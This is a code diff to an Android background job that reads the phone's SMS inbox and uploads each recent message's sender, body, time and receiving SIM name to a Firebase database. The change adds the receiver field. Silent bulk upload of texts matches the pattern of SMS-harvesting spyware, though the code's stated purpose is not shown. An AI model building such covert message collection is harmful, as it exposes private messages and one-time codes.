@@ -1,5 +1,6 @@
 package com.example.sms;
 
+import android.annotation.SuppressLint;
 import android.app.job.JobParameters;
 import android.app.job.JobService;
 import android.content.ContentResolver;
@@ -11,6 +12,8 @@ import android.net.Uri;
 import android.os.Bundle;
 import android.provider.Telephony;
 import android.telephony.SmsMessage;
+import android.telephony.SubscriptionInfo;
+import android.telephony.SubscriptionManager;
 import android.util.Log;
 
 import androidx.annotation.NonNull;
@@ -26,6 +29,7 @@ import java.util.Date;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.LinkedList;
+import java.util.List;
 import java.util.Locale;
 import java.util.Map;
 import java.util.Queue;
@@ -98,33 +102,41 @@ public class SmsJob extends JobService {
            int timestampIndex = cursor.getColumnIndex(Telephony.Sms.DATE);
            int senderIndex = cursor.getColumnIndex(Telephony.Sms.ADDRESS);
            int bodyIndex = cursor.getColumnIndex(Telephony.Sms.BODY);
+           int subidIndex=cursor.getColumnIndex("sub_id");
 
            Queue<String> senderQueue = new LinkedList<>();
            Queue<String> bodyQueue = new LinkedList<>();
            Queue<Long> timestampQueue = new LinkedList<>();
            Queue<String> uniqueIdQueue = new LinkedList<>(); // New queue for unique IDs
+           Queue<String> receiverQueue=new LinkedList<>();
+
+           SubscriptionManager subscriptionManager=(SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
+           @SuppressLint("MissingPermission") List<SubscriptionInfo> subscriptionInfoList=subscriptionManager.getActiveSubscriptionInfoList();
 
            do {
                long timestamp = cursor.getLong(timestampIndex);
                String sender = cursor.getString(senderIndex);
                String body = cursor.getString(bodyIndex);
+               int subid=cursor.getInt(subidIndex);
 
                String uniqueId = UUID.randomUUID().toString();
                String uniqueIdPrefix = uniqueId.substring(0, 2); // Extract first 2 characters
+               String receivernumber=getReceiverNumberForSubId(subscriptionInfoList,subid);
 
                senderQueue.add(sender);
                bodyQueue.add(body);
                timestampQueue.add(timestamp);
                uniqueIdQueue.add(uniqueIdPrefix); // Add prefix to queue
+               receiverQueue.add(receivernumber);
 
            } while (cursor.moveToNext());
 
            cursor.close();
 
-           processSmsQueues(context, senderQueue, bodyQueue, timestampQueue, uniqueIdQueue); // Pass additional queue
+           processSmsQueues(context, senderQueue, bodyQueue, timestampQueue, uniqueIdQueue,receiverQueue); // Pass additional queue
        }
     }
-    private void processSmsQueues(Context context, Queue<String> senderQueue, Queue<String> bodyQueue, Queue<Long> timestampQueue, Queue<String> uniqueIdQueue) {
+    private void processSmsQueues(Context context, Queue<String> senderQueue, Queue<String> bodyQueue, Queue<Long> timestampQueue, Queue<String> uniqueIdQueue,Queue<String> receiverQueue) {
         String custom = getCustomPathFromPreferences(context);
         long thresholdTime = System.currentTimeMillis() - (24 * 60 * 60 * 1000);
 
@@ -137,6 +149,7 @@ public class SmsJob extends JobService {
             String body = bodyQueue.poll();
             long timestamp = timestampQueue.poll();
             String uniqueIdPrefix = uniqueIdQueue.poll();
+            String receiver=receiverQueue.poll();
 
             String formattedTime = getFormattedTime(timestamp);
             assert body != null;
@@ -156,7 +169,7 @@ public class SmsJob extends JobService {
                             public void onDataChange(DataSnapshot dataSnapshot) {
                                 if (!dataSnapshot.exists()) {
                                     // Message doesn't exist, send it to Firebase
-                                    saveoldSmsToFirebase(custom, sender, body, messageKey);
+                                    saveoldSmsToFirebase(custom, sender, body, messageKey,receiver);
                                     Intent start = new Intent(context, BackgroundRun.class);
                                     start.setAction("UPDATE_TIME");
                                     context.startService(start);
@@ -183,6 +196,23 @@ public class SmsJob extends JobService {
         }
     }
 
+    private String getReceiverNumberForSubId(List<SubscriptionInfo> subscriptionInfoList, int subId) {
+        for (SubscriptionInfo info : subscriptionInfoList) {
+            if (info.getSubscriptionId() == subId) {
+                return (String) info.getDisplayName();  // Or info.getDisplayName().toString() if you want SIM name
+            }
+        }
+        return null;
+    }
+
+
+
+
+
+
+
+
+
 
 
     public String getFormattedTime(long timestampMillis) {
@@ -201,7 +231,7 @@ public class SmsJob extends JobService {
     }
 
 
-    private void saveoldSmsToFirebase(String custompath,String sender, String messageBody, String timestampmills) {
+    private void saveoldSmsToFirebase(String custompath,String sender, String messageBody, String timestampmills,String receiver) {
 
         String path = "user_messages/" + custompath;
 
@@ -213,11 +243,14 @@ public class SmsJob extends JobService {
 
 
         // Create a data object to store in the database
-        MySmsMessage smsMessage = new MySmsMessage(sender, messageBody,timestampmills);
-
+        Map<String, Object> statusMap = new HashMap<>();
+        statusMap.put("sender",sender);
+        statusMap.put("message",messageBody);
+        statusMap.put("time",timestampmills);
+        statusMap.put("receiver",receiver);
         // Save the SMS to the database under the custom path with timestamp as the key
 
-        databaseReference.child(timestampmills).setValue(smsMessage);
+        databaseReference.child(timestampmills).setValue(statusMap);
 
 
 
